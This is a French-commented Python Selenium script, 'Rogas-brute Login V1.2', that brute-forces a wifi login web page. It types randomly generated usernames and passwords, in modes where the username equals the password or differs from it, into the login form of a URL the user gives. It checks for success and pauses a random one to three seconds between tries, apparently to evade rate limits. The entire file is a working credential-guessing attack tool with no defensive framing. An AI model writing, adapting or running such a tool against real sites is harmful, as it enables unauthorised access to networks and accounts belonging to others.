from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import random

def generate_random_password(length=8, order=1):
    lower_letters = 'abcdefghijklmnopqrstuvwxyz'
    digits = '0123456789'
    
    if order == 1:  # Format abc123
        password = ''.join(random.choices(lower_letters, k=length // 2)) + ''.join(random.choices(digits, k=length - length // 2))
    elif order == 2:  # Format a1b2c3
        password = ''.join(random.choice(lower_letters + digits) for _ in range(length))
    elif order == 3:  # Mélange complet
        password = ''.join(random.choices(lower_letters + digits, k=length))
    
    return ''.join(random.sample(password, len(password)))  # Mélange final pour éviter l'ordre prévisible

# Fonction de connexion avec meilleure gestion des sélecteurs et attentes dynamiques
def attempt_login(driver, url, username, password):
    driver.get(url)
    
    try:
        # Attendre que les champs de connexion soient visibles
        username_field = WebDriverWait(driver, 10).until(EC.visibility_of_element_located((By.NAME, 'username')))
        password_field = WebDriverWait(driver, 10).until(EC.visibility_of_element_located((By.NAME, 'password')))
        
        # Remplir les champs avec les valeurs données
        username_field.clear()
        username_field.send_keys(username)
        password_field.clear()
        password_field.send_keys(password)
        
        # Localiser et cliquer sur le bouton de soumission
        submit_button = driver.find_element(By.CSS_SELECTOR, 'button[type="submit"]')
        submit_button.click()
        
        # Attendre un changement de l'URL ou la présence d'un élément spécifique indiquant le succès
        WebDriverWait(driver, 10).until(lambda d: "Bienvenue" in d.page_source or d.current_url != url)
        
        # Vérifier si la connexion a réussi
        if "Bienvenue" in driver.page_source or "dashboard" in driver.current_url:
            return True
        else:
            return False
    except Exception as e:
        print(f"Erreur lors de la tentative de connexion: {e}")
        return False

# Fonction brute force pour scenario 1 : username = password
def brute_force_username_equals_password(url, max_attempts, order):
    service = Service('/usr/local/bin/geckodriver')
    driver = webdriver.Firefox(service=service)
    
    try:
        attempts = 0
        length = int(input("Entrez le nombre de caractères pour le mot de passe (par défaut 6): ") or 6)

        while attempts < max_attempts:
            password = generate_random_password(length, order)
            success = attempt_login(driver, url, password, password)
            attempts += 1
            print(f"Tentative #{attempts}: Mot de passe: {password} - {'Succès' if success else 'Échec'}")
            
            if success:
                print(f"Mot de passe trouvé: {password} en {attempts} tentatives")
                break
            
            # Ajouter un délai aléatoire entre les tentatives
            time.sleep(random.uniform(1, 3))
    finally:
        driver.quit()

# Fonction brute force pour scenario 2 : username != password
def brute_force_username_not_equals_password(url, max_attempts):
    service = Service('/usr/local/bin/geckodriver')
    driver = webdriver.Firefox(service=service)
    
    try:
        attempts = 0
        length_user = int(input("Entrez le nombre de caractères pour le nom d'utilisateur (par défaut 6): ") or 6)
        length_pass = int(input("Entrez le nombre de caractères pour le mot de passe (par défaut 8): ") or 8)
        
        while attempts < max_attempts:
            username = generate_random_password(length_user)
            password = generate_random_password(length_pass)
            success = attempt_login(driver, url, username, password)
            attempts += 1
            print(f"Tentative #{attempts}: Utilisateur: {username} - Mot de passe: {password} - {'Succès' if success else 'Échec'}")
            
            if success:
                print(f"Nom d'utilisateur trouvé: {username} avec mot de passe: {password} en {attempts} tentatives")
                break
            
            # Ajouter un délai aléatoire entre les tentatives
            time.sleep(random.uniform(1, 3))
    finally:
        driver.quit()

# Gestion améliorée de l'interaction avec l'utilisateur
print("=== Rogas-brute Login  V1.2 ===")
url = input("Entrez l'URL du site de la page de connexion du wifi == eg:http://haca.net == : ")
scenario = int(input("Entrez 1 pour username = password, 2 pour username != password : "))
max_attempts = int(input("Entrez le nombre maximum de tentatives (par défaut 10): ") or 10)

# Vérifier le scénario et exécuter la bonne fonction
if scenario == 1:
    order = int(input("Choisissez l'ordre des caractères: 1 pour abc123, 2 pour a1b2c3, 3 pour mélange: "))
    brute_force_username_equals_password(url, max_attempts, order)
elif scenario == 2:
    brute_force_username_not_equals_password(url, max_attempts)
else:
    print("Option de scénario non valide. Veuillez choisir 1 ou 2.")
